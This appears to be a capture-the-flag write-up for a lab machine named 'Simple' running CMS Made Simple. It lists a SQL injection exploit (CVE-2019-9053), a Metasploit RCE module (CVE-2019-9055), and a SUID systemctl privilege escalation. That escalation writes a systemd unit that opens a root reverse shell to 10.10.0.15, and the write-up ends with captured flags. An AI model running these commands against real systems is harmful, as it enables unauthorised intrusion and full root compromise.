# Simple

**IP Address:** 172.31.1.2

## Enumeration
### Open Ports

## Exploitation
### Exploit Details (SearchSploit) #1
* **Name** - CMS Made Simple < 2.2.10 - SQL Injection 
* **CVE** - 2019-9053 
* **Module** - php/webapps/46635.py
* **Disclosed** - 2019-04-02 
* **References**
  * https://www.exploit-db.com/exploits/46635
  * https://nvd.nist.gov/vuln/detail/CVE-2019-9053

Commands
```
python 46635.py -u http://$ip -w /usr/share/wordlists/rockyou.txt -c
```

![Execute Exploit](images/exploit1.png)

![Execute Exploit](images/exploit2.png)

### Exploit Details (Metasploit) #2
* **Name** - CMS Made Simple Authenticated RCE via object injection 
* **CVE** - 2019-9055 
* **Module** - exploit/multi/http/cmsms_object_injection_rce
* **Disclosed** - 2019-03-26 
* **References**
  * https://nvd.nist.gov/vuln/detail/CVE-2019-9055
  * https://newsletter.cmsmadesimple.org/w/89247Qog4jCRCuRinvhsofwg
  * https://www.cmsmadesimple.org/2019/03/Announcing-CMS-Made-Simple-v2.2.10-Spuzzum


1. Show metasploit options. 

Commands
```
show options
```

![Execute Exploit](images/exploit3.png)

2. Run exploit. 

Commands
```
run
shell
whoami
cat /home/david/access.txt
```

## Privilege Escalation
### Exploit Details (SUID (systemctl))
* **Name** - SUID (systemctl)
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A


Commands
```bash
echo '[Unit]' > shell.service
echo 'Description=root' >> shell.service
echo '[Service]' >> shell.service
echo 'Type=simple' >> shell.service
echo 'User=root' >> shell.service
echo 'ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.0.15/53 0>&1"' >> shell.service
echo '[Install]' >> shell.service
echo 'WantedBy=multi-user.target' >> shell.service
chmod +x shell.service
cp shell.service /etc/systemd/system/
systemctl enable /etc/systemd/system/shell.service
systemctl start shell
whoami
cat /root/system.txt
```
![Execute Exploit](images/privesc1.png)

## Loot
```
access.txt
dbe6218bdc74df7e7529dd4641629bb5
system.txt
c20f32787812a86c23e91fd0a0c069a1
```